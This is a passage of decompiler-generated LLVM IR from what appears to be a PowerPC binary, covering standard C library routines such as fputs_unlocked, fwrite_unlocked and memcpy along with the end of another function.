dec_label_pc_1000f25c:                            ; preds = %dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge, %dec_label_pc_1000f22c, %dec_label_pc_1000f224
  %v1_1000f26c = phi i32 [ %v1_1000f26c.pre, %dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge ], [ %v1_1000f218, %dec_label_pc_1000f22c ], [ %v1_1000f218, %dec_label_pc_1000f224 ]
  %v0_1000f268 = phi i32 [ %v0_1000f268.pre, %dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge ], [ %v1_1000f20c, %dec_label_pc_1000f22c ], [ %v1_1000f20c, %dec_label_pc_1000f224 ]
  %v0_1000f260 = phi i32 [ %v0_1000f260.pre, %dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge ], [ %v0_1000f204, %dec_label_pc_1000f22c ], [ %v0_1000f204, %dec_label_pc_1000f224 ]
  store i32 %v2_1000ee9c.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000f260 = mul i32 %v0_1000f260, 4
  store i32 %v1_1000f260, i32* %r0.global-to-local, align 4
  %v2_1000f264 = add i32 %v1_1000f260, %v2_1000ee9c.pre-phi
  %v3_1000f264 = inttoptr i32 %v2_1000f264 to i32*
  %v4_1000f264 = load i32, i32* %v3_1000f264, align 4
  store i32 %v4_1000f264, i32* %r0.global-to-local, align 4
  %v1_1000f268 = mul i32 %v0_1000f268, 4
  %v2_1000f26c = add i32 %v1_1000f268, %v1_1000f26c
  store i32 %v2_1000f26c, i32* %r9.global-to-local, align 4
  %v2_1000f270 = add i32 %v2_1000f26c, 40
  %v3_1000f270 = inttoptr i32 %v2_1000f270 to i32*
  store i32 %v4_1000f264, i32* %v3_1000f270, align 4
  br label %dec_label_pc_1000f274

dec_label_pc_1000f274:                            ; preds = %dec_label_pc_1000f234, %dec_label_pc_1000f200, %dec_label_pc_1000f25c
  %v0_1000f274 = load i32, i32* @r28, align 4
  %v1_1000f274 = add i32 %v0_1000f274, 28
  %v2_1000f274 = inttoptr i32 %v1_1000f274 to i32*
  %v3_1000f274 = load i32, i32* %v2_1000f274, align 4
  %v0_1000f278 = load i32, i32* @r27, align 4
  %v1_1000f278 = add i32 %v0_1000f278, 1
  store i32 %v1_1000f278, i32* @r27, align 4
  %v1_1000f27c = add i32 %v3_1000f274, 2
  store i32 %v1_1000f27c, i32* %r9.global-to-local, align 4
  %v2_1000f280 = icmp slt i32 %v1_1000f278, %v1_1000f27c
  br i1 %v2_1000f280, label %dec_label_pc_1000f1bc, label %dec_label_pc_1000f2a4

dec_label_pc_1000f28c:                            ; preds = %dec_label_pc_1000f1b0
  %v0_1000f28c = load i32, i32* @r28, align 4
  %v1_1000f28c = add i32 %v0_1000f28c, 28
  %v2_1000f28c = inttoptr i32 %v1_1000f28c to i32*
  %v3_1000f28c = load i32, i32* %v2_1000f28c, align 4
  store i32 %v3_1000f28c, i32* %r5.global-to-local, align 4
  %v1_1000f290 = add i32 %v0_1000f28c, 40
  store i32 %v1_1000f290, i32* @r3, align 4
  %v0_1000f294 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f294 = trunc i32 %v0_1000f294 to i8
  %v3_1000f294 = add i32 %v0_1000f28c, 38
  %v4_1000f294 = inttoptr i32 %v3_1000f294 to i8*
  store i8 %v1_1000f294, i8* %v4_1000f294, align 1
  %v2_1000f298 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000f298, i32* @r4, align 4
  %v0_1000f29c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f29c = mul i32 %v0_1000f29c, 4
  store i32 %v1_1000f29c, i32* @r5, align 4
  store i32 268497572, i32* @lr, align 4
  %v0_1000f2a0 = call i32 @memcpy()
  store i32 %v0_1000f2a0, i32* %r3.global-to-local, align 4
  %v0_1000f2a4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f2a4

dec_label_pc_1000f2a4:                            ; preds = %dec_label_pc_1000f274, %dec_label_pc_1000f28c
  %v0_1000f2a4 = phi i32 [ %v0_1000f2a4.pre, %dec_label_pc_1000f28c ], [ %v0_1000f274, %dec_label_pc_1000f274 ]
  %v1_1000f2a4 = add i32 %v0_1000f2a4, 16
  %v2_1000f2a4 = inttoptr i32 %v1_1000f2a4 to i32*
  %v3_1000f2a4 = load i32, i32* %v2_1000f2a4, align 4
  store i32 %v3_1000f2a4, i32* %r0.global-to-local, align 4
  %v0_1000f2a8 = load i32, i32* @r26, align 4
  %v2_1000f2a8 = add i32 %v0_1000f2a4, 24
  %v3_1000f2a8 = inttoptr i32 %v2_1000f2a8 to i32*
  store i32 %v0_1000f2a8, i32* %v3_1000f2a8, align 4
  %v0_1000f2ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f2ac = and i32 %v0_1000f2ac, 128
  store i32 %v1_1000f2ac, i32* %r9.global-to-local, align 4
  %v3_1000f2ac = icmp eq i32 %v1_1000f2ac, 0
  br i1 %v3_1000f2ac, label %dec_label_pc_1000f2b4, label %dec_label_pc_1000f2c0

dec_label_pc_1000f2b4:                            ; preds = %dec_label_pc_1000f2a4
  %v0_1000f2b4 = load i32, i32* @r30, align 4
  %v1_1000f2b4 = add i32 %v0_1000f2b4, 1
  store i32 %v1_1000f2b4, i32* %r0.global-to-local, align 4
  %v1_1000f2b8 = load i32, i32* @r28, align 4
  %v2_1000f2b8 = inttoptr i32 %v1_1000f2b8 to i32*
  store i32 %v1_1000f2b4, i32* %v2_1000f2b8, align 4
  br label %dec_label_pc_1000f2d8

dec_label_pc_1000f2c0:                            ; preds = %dec_label_pc_1000f2a4
  %v2_1000f2c0 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000f2c0, i32* %r0.global-to-local, align 4
  %v0_1000f2c4 = load i32, i32* @r28, align 4
  %v1_1000f2c4 = inttoptr i32 %v0_1000f2c4 to i32*
  %v2_1000f2c4 = load i32, i32* %v1_1000f2c4, align 4
  %v1_1000f2c8 = load i32, i32* @r30, align 4
  %v2_1000f2c8 = sub i32 %v1_1000f2c8, %v2_1000f2c0
  %v1_1000f2cc = mul i32 %v2_1000f2c8, 4
  store i32 %v1_1000f2cc, i32* %r0.global-to-local, align 4
  %v2_1000f2d0 = add i32 %v1_1000f2cc, %v2_1000f2c4
  store i32 %v2_1000f2d0, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f2d0, i32* %v1_1000f2c4, align 4
  br label %dec_label_pc_1000f2d8

dec_label_pc_1000f2d8:                            ; preds = %dec_label_pc_1000f2b4, %dec_label_pc_1000f2c0
  %v0_1000f2d8 = load i32, i32* @r28, align 4
  %v1_1000f2d8 = add i32 %v0_1000f2d8, 28
  %v2_1000f2d8 = inttoptr i32 %v1_1000f2d8 to i32*
  %v3_1000f2d8 = load i32, i32* %v2_1000f2d8, align 4
  store i32 %v3_1000f2d8, i32* %r9.global-to-local, align 4
  %v1_1000f2dc = add i32 %v3_1000f2d8, 2
  br label %dec_label_pc_1000f2e8

dec_label_pc_1000f2e8:                            ; preds = %dec_label_pc_1000ee4c, %dec_label_pc_1000ef20, %dec_label_pc_1000effc, %dec_label_pc_1000eff0, %dec_label_pc_1000f018, %dec_label_pc_1000ef54, %dec_label_pc_1000f1f4, %dec_label_pc_1000f0a4, %dec_label_pc_1000f198, %dec_label_pc_1000f2d8
  %storemerge2 = phi i32 [ %v1_1000f2dc, %dec_label_pc_1000f2d8 ], [ -1, %dec_label_pc_1000f198 ], [ -1, %dec_label_pc_1000f0a4 ], [ -1, %dec_label_pc_1000f1f4 ], [ -1, %dec_label_pc_1000ef54 ], [ -1, %dec_label_pc_1000f018 ], [ -1, %dec_label_pc_1000eff0 ], [ -1, %dec_label_pc_1000effc ], [ -1, %dec_label_pc_1000ef20 ], [ -1, %dec_label_pc_1000ee4c ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ede4, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000f2cc, { 1, 0 }
  uselistorder i32 %v0_1000f2a4, { 1, 0 }
  uselistorder i32 %v1_1000f278, { 1, 2, 0 }
  uselistorder i32 %v1_1000f260, { 1, 0 }
  uselistorder i32 %v0_1000f24c, { 0, 2, 1 }
  uselistorder i32 %v3_1000f21c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000f218, { 1, 2, 0 }
  uselistorder i32 %v1_1000f20c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f204, { 1, 0 }
  uselistorder i32 %v0_1000f204, { 1, 2, 0 }
  uselistorder i32 %v3_1000f1cc, { 1, 0, 2 }
  uselistorder i32 %v1_1000f1c4, { 1, 0 }
  uselistorder i32 %v0_1000f1e4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f13c, { 1, 2, 0 }
  uselistorder i32 %v1_1000f114, { 2, 1, 0 }
  uselistorder i32 %v1_1000f100, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f0e4, { 1, 0, 2 }
  uselistorder i32 %v1_1000f0b0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000f06c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000f030, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000f01c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000ef8c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000ef88, { 1, 0 }
  uselistorder i32 %v0_1000efa0, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000ef04, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000eefc, { 1, 0 }
  uselistorder i32 %v1_1000eeec, { 1, 0 }
  uselistorder i32 %v3_1000eee4, { 1, 0, 2 }
  uselistorder i32 %v0_1000ef60, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000ef30, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000eec0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000eea8, { 1, 0 }
  uselistorder i32 %v2_1000ee9c.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000ee7c, { 1, 0 }
  uselistorder i32 %v1_1000ee64, { 1, 2, 0 }
  uselistorder i32 %v0_1000ee58, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1001959c.602 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f2e8, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000f2d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f2a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f274, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f200, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f054, { 1, 0 }
  uselistorder label %dec_label_pc_1000f028, { 1, 0 }
  uselistorder label %dec_label_pc_1000efdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000efd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000eee4, { 1, 0 }
  uselistorder label %dec_label_pc_1000eee0, { 1, 0 }
  uselistorder label %dec_label_pc_1000eecc, { 1, 0 }
  uselistorder label %dec_label_pc_1000eeac, { 1, 0 }
  uselistorder label %dec_label_pc_1000eea8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee8c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000f314 = call i32 @__GI_strlen()
  store i32 %v0_1000f314, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000f330.608 to i32), i32* @lr, align 4
  %v4_1000f32c = inttoptr i32 %arg2 to i16*
  %v5_1000f32c = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000f314, i16* %v4_1000f32c)
  %v1_1000f334 = load i32, i32* @r27, align 4
  %v4_1000f334 = icmp eq i32 %v5_1000f32c, %v1_1000f334
  br i1 %v4_1000f334, label %dec_label_pc_1000f33c, label %dec_label_pc_1000f340

dec_label_pc_1000f33c:                            ; preds = %entry
  br label %dec_label_pc_1000f340

dec_label_pc_1000f340:                            ; preds = %entry, %dec_label_pc_1000f33c
  %v0_1000f340 = phi i32 [ -1, %entry ], [ %v5_1000f32c, %dec_label_pc_1000f33c ]
  ret i32 %v0_1000f340

; uselistorder directives
  uselistorder label %dec_label_pc_1000f340, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000f370 = load i16, i16* %arg4, align 2
  %v4_1000f370 = zext i16 %v3_1000f370 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000f380 = call i32 @__asm_rlwinm(i32 %v4_1000f370, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000f388 = icmp eq i32 %v1_1000f380, 192
  br i1 %v3_1000f388, label %dec_label_pc_1000f39c, label %dec_label_pc_1000f390

dec_label_pc_1000f390:                            ; preds = %entry
  store i32 268497812, i32* @lr, align 4
  %v0_1000f390 = call i32 @__stdio_trans2w_o()
  %v3_1000f394 = icmp eq i32 %v0_1000f390, 0
  br i1 %v3_1000f394, label %dec_label_pc_1000f39c, label %dec_label_pc_1000f3f4

dec_label_pc_1000f39c:                            ; preds = %dec_label_pc_1000f390, %entry
  %v0_1000f39c = load i32, i32* @r29, align 4
  %v3_1000f39c = icmp eq i32 %v0_1000f39c, 0
  %v0_1000f3a0 = load i32, i32* @r30, align 4
  %v3_1000f3a0 = icmp eq i32 %v0_1000f3a0, 0
  %brmerge = or i1 %v3_1000f39c, %v3_1000f3a0
  br i1 %brmerge, label %dec_label_pc_1000f3f4, label %dec_label_pc_1000f3ac

dec_label_pc_1000f3ac:                            ; preds = %dec_label_pc_1000f39c
  %v2_1000f3b4 = udiv i32 -1, %v0_1000f39c
  %v0_1000f3b8 = load i32, i32* @r31, align 4
  %v3_1000f3bc = icmp ugt i32 %v0_1000f3a0, %v2_1000f3b4
  %v1_1000f3d4 = inttoptr i32 %v0_1000f3b8 to i16*
  br i1 %v3_1000f3bc, label %dec_label_pc_1000f3d4, label %dec_label_pc_1000f3c4

dec_label_pc_1000f3c4:                            ; preds = %dec_label_pc_1000f3ac
  %v0_1000f3b0 = load i32, i32* @r28, align 4
  %v2_1000f3c4 = mul i32 %v0_1000f3a0, %v0_1000f39c
  store i32 %v2_1000f3c4, i32* %r4.global-to-local, align 4
  store i32 268497868, i32* @lr, align 4
  %v5_1000f3c8 = call i32 @__stdio_fwrite(i32 %v0_1000f3b0, i32 %v2_1000f3c4, i16* %v1_1000f3d4)
  %v1_1000f3cc = load i32, i32* @r29, align 4
  %v2_1000f3cc = udiv i32 %v5_1000f3c8, %v1_1000f3cc
  store i32 %v2_1000f3cc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3f8

dec_label_pc_1000f3d4:                            ; preds = %dec_label_pc_1000f3ac
  %v2_1000f3d4 = load i16, i16* %v1_1000f3d4, align 2
  %v1_1000f3d8 = or i16 %v2_1000f3d4, 8
  store i16 %v1_1000f3d8, i16* %v1_1000f3d4, align 2
  %v0_1000f3e0 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000f3ec = inttoptr i32 %v0_1000f3e0 to i32*
  store i32 22, i32* %v2_1000f3ec, align 4
  %v0_1000f3fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3f8

dec_label_pc_1000f3f4:                            ; preds = %dec_label_pc_1000f39c, %dec_label_pc_1000f390
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3f8

dec_label_pc_1000f3f8:                            ; preds = %dec_label_pc_1000f3d4, %dec_label_pc_1000f3c4, %dec_label_pc_1000f3f4
  %v0_1000f3fc = phi i32 [ %v0_1000f3fc.pre, %dec_label_pc_1000f3d4 ], [ %v2_1000f3cc, %dec_label_pc_1000f3c4 ], [ 0, %dec_label_pc_1000f3f4 ]
  ret i32 %v0_1000f3fc

; uselistorder directives
  uselistorder i16* %v1_1000f3d4, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3f8, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000f410 = load i32, i32* @r5, align 4
  %v1_1000f410 = call i32 @__asm_rlwinm.(i32 %v0_1000f410, i32 29, i32 3, i32 31)
  store i32 %v1_1000f410, i32* %r9.global-to-local, align 4
  %v4_1000f410 = icmp eq i32 %v1_1000f410, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000f414 = load i32, i32* @r4, align 4
  %v1_1000f414 = add i32 %v0_1000f414, -4
  store i32 %v1_1000f414, i32* %r4.global-to-local, align 4
  %v0_1000f418 = load i32, i32* @r3, align 4
  %v1_1000f418 = add i32 %v0_1000f418, -4
  store i32 %v1_1000f418, i32* @r11, align 4
  br i1 %v4_1000f410, label %dec_label_pc_1000f440, label %dec_label_pc_1000f420

dec_label_pc_1000f420:                            ; preds = %entry
  %v1_1000f420 = urem i32 %v1_1000f418, 4
  %v3_1000f420 = icmp eq i32 %v1_1000f420, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000f420, label %dec_label_pc_1000f428, label %dec_label_pc_1000f47c

dec_label_pc_1000f428:                            ; preds = %dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge, %dec_label_pc_1000f420
  %v1_1000f434.pre = phi i32 [ %v1_1000f418, %dec_label_pc_1000f420 ], [ %v1_1000f434.pre.pre, %dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge ]
  %v0_1000f428 = phi i32 [ %v1_1000f410, %dec_label_pc_1000f420 ], [ %v1_1000f49c, %dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000f420 ], [ %v2_1000f484, %dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge ]
  store i32 %v0_1000f428, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f42c

dec_label_pc_1000f42c:                            ; preds = %dec_label_pc_1000f42c, %dec_label_pc_1000f428
  %v1_1000f434 = phi i32 [ %v2_1000f438, %dec_label_pc_1000f42c ], [ %v1_1000f434.pre, %dec_label_pc_1000f428 ]
  %v0_1000f42c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f42c = add i32 %v0_1000f42c, 4
  %v2_1000f42c = inttoptr i32 %v1_1000f42c to i32*
  %v3_1000f42c = load i32, i32* %v2_1000f42c, align 4
  %v1_1000f430 = add i32 %v0_1000f42c, 8
  %v2_1000f430 = inttoptr i32 %v1_1000f430 to i32*
  %v3_1000f430 = load i32, i32* %v2_1000f430, align 4
  store i32 %v3_1000f430, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f430, i32* %r4.global-to-local, align 4
  %v2_1000f434 = add i32 %v1_1000f434, 4
  %v3_1000f434 = inttoptr i32 %v2_1000f434 to i32*
  store i32 %v3_1000f42c, i32* %v3_1000f434, align 4
  %v0_1000f438 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f438 = load i32, i32* @r11, align 4
  %v2_1000f438 = add i32 %v1_1000f438, 8
  %v3_1000f438 = inttoptr i32 %v2_1000f438 to i32*
  store i32 %v0_1000f438, i32* %v3_1000f438, align 4
  store i32 %v2_1000f438, i32* @r11, align 4
  %v0_1000f43c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f43c = add i32 %v0_1000f43c, -1
  store i32 %v1_1000f43c, i32* %ctr.global-to-local, align 4
  %v2_1000f43c = icmp eq i32 %v1_1000f43c, 0
  br i1 %v2_1000f43c, label %dec_label_pc_1000f440, label %dec_label_pc_1000f42c

dec_label_pc_1000f440:                            ; preds = %dec_label_pc_1000f42c, %dec_label_pc_1000f49c, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000f484, %dec_label_pc_1000f49c ], [ %.0, %dec_label_pc_1000f42c ]
  %v1_1000f440 = urem i32 %.1, 8
  store i32 %v1_1000f440, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000f440, 4
  br i1 %tmp, label %dec_label_pc_1000f458, label %dec_label_pc_1000f44c

dec_label_pc_1000f44c:                            ; preds = %dec_label_pc_1000f440
  %v0_1000f44c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f44c = add i32 %v0_1000f44c, 4
  %v2_1000f44c = inttoptr i32 %v1_1000f44c to i32*
  %v3_1000f44c = load i32, i32* %v2_1000f44c, align 4
  store i32 %v1_1000f44c, i32* %r4.global-to-local, align 4
  %v1_1000f450 = add nsw i32 %v1_1000f440, -4
  store i32 %v1_1000f450, i32* @r5, align 4
  %v1_1000f454 = load i32, i32* @r11, align 4
  %v2_1000f454 = add i32 %v1_1000f454, 4
  %v3_1000f454 = inttoptr i32 %v2_1000f454 to i32*
  store i32 %v3_1000f44c, i32* %v3_1000f454, align 4
  store i32 %v2_1000f454, i32* @r11, align 4
  %v0_1000f458.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000f458

dec_label_pc_1000f458:                            ; preds = %dec_label_pc_1000f440, %dec_label_pc_1000f44c
  %v0_1000f458 = phi i32 [ %v1_1000f440, %dec_label_pc_1000f440 ], [ %v0_1000f458.pre, %dec_label_pc_1000f44c ]
  %v3_1000f458 = icmp eq i32 %v0_1000f458, 0
  %v0_1000f45c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f458, i32 %v0_1000f45c)
  %v0_1000f460 = load i32, i32* @r5, align 4
  store i32 %v0_1000f460, i32* %ctr.global-to-local, align 4
  %v0_1000f464 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f464 = add i32 %v0_1000f464, 3
  store i32 %v1_1000f464, i32* %r4.global-to-local, align 4
  %v0_1000f468 = load i32, i32* @r11, align 4
  %v1_1000f468 = add i32 %v0_1000f468, 3
  store i32 %v1_1000f468, i32* %r9.global-to-local, align 4
  %v1_1000f46c9 = add i32 %v0_1000f464, 4
  %v2_1000f46c10 = inttoptr i32 %v1_1000f46c9 to i8*
  %v3_1000f46c11 = load i8, i8* %v2_1000f46c10, align 1
  store i32 %v1_1000f46c9, i32* %r4.global-to-local, align 4
  %v3_1000f47013 = add i32 %v0_1000f468, 4
  %v4_1000f47014 = inttoptr i32 %v3_1000f47013 to i8*
  store i8 %v3_1000f46c11, i8* %v4_1000f47014, align 1
  store i32 %v3_1000f47013, i32* %r9.global-to-local, align 4
  %v0_1000f47415 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f47416 = add i32 %v0_1000f47415, -1
  store i32 %v1_1000f47416, i32* %ctr.global-to-local, align 4
  %v2_1000f47417 = icmp eq i32 %v1_1000f47416, 0
  br i1 %v2_1000f47417, label %dec_label_pc_1000f4a8, label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge

dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge: ; preds = %dec_label_pc_1000f458, %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge
  %v3_1000f47018 = phi i32 [ %v3_1000f470, %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge ], [ %v3_1000f47013, %dec_label_pc_1000f458 ]
  %v0_1000f46c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f46c = add i32 %v0_1000f46c.pre, 1
  %v2_1000f46c = inttoptr i32 %v1_1000f46c to i8*
  %v3_1000f46c = load i8, i8* %v2_1000f46c, align 1
  store i32 %v1_1000f46c, i32* %r4.global-to-local, align 4
  %v3_1000f470 = add i32 %v3_1000f47018, 1
  %v4_1000f470 = inttoptr i32 %v3_1000f470 to i8*
  store i8 %v3_1000f46c, i8* %v4_1000f470, align 1
  store i32 %v3_1000f470, i32* %r9.global-to-local, align 4
  %v0_1000f474 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f474 = add i32 %v0_1000f474, -1
  store i32 %v1_1000f474, i32* %ctr.global-to-local, align 4
  %v2_1000f474 = icmp eq i32 %v1_1000f474, 0
  br i1 %v2_1000f474, label %dec_label_pc_1000f4a8, label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge

dec_label_pc_1000f47c:                            ; preds = %dec_label_pc_1000f420
  %v1_1000f47c = sub nsw i32 4, %v1_1000f420
  store i32 %v1_1000f47c, i32* %ctr.global-to-local, align 4
  %v1_1000f484 = load i32, i32* @r5, align 4
  %v2_1000f484 = sub i32 %v1_1000f484, %v1_1000f47c
  br label %dec_label_pc_1000f488

dec_label_pc_1000f488:                            ; preds = %dec_label_pc_1000f488.dec_label_pc_1000f488_crit_edge, %dec_label_pc_1000f47c
  %v2_1000f490 = phi i32 [ %v1_1000f494, %dec_label_pc_1000f488.dec_label_pc_1000f488_crit_edge ], [ %v1_1000f418, %dec_label_pc_1000f47c ]
  %v0_1000f488 = phi i32 [ %v0_1000f488.pre, %dec_label_pc_1000f488.dec_label_pc_1000f488_crit_edge ], [ %v1_1000f414, %dec_label_pc_1000f47c ]
  %v1_1000f488 = add i32 %v0_1000f488, 4
  %v2_1000f488 = inttoptr i32 %v1_1000f488 to i8*
  %v3_1000f488 = load i8, i8* %v2_1000f488, align 1
  %v1_1000f48c = add i32 %v0_1000f488, 1
  store i32 %v1_1000f48c, i32* %r4.global-to-local, align 4
  %v3_1000f490 = add i32 %v2_1000f490, 4
  %v4_1000f490 = inttoptr i32 %v3_1000f490 to i8*
  store i8 %v3_1000f488, i8* %v4_1000f490, align 1
  %v0_1000f494 = load i32, i32* @r11, align 4
  %v1_1000f494 = add i32 %v0_1000f494, 1
  store i32 %v1_1000f494, i32* @r11, align 4
  %v0_1000f498 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f498 = add i32 %v0_1000f498, -1
  store i32 %v1_1000f498, i32* %ctr.global-to-local, align 4
  %v2_1000f498 = icmp eq i32 %v1_1000f498, 0
  br i1 %v2_1000f498, label %dec_label_pc_1000f49c, label %dec_label_pc_1000f488.dec_label_pc_1000f488_crit_edge

dec_label_pc_1000f488.dec_label_pc_1000f488_crit_edge: ; preds = %dec_label_pc_1000f488
  %v0_1000f488.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f488

dec_label_pc_1000f49c:                            ; preds = %dec_label_pc_1000f488
  %v1_1000f49c = call i32 @__asm_rlwinm.(i32 %v2_1000f484, i32 29, i32 3, i32 31)
  store i32 %v1_1000f49c, i32* %r9.global-to-local, align 4
  %v4_1000f49c = icmp eq i32 %v1_1000f49c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000f49c, label %dec_label_pc_1000f440, label %dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge

dec_label_pc_1000f49c.dec_label_pc_1000f428_crit_edge: ; preds = %dec_label_pc_1000f49c
  %v1_1000f434.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000f428

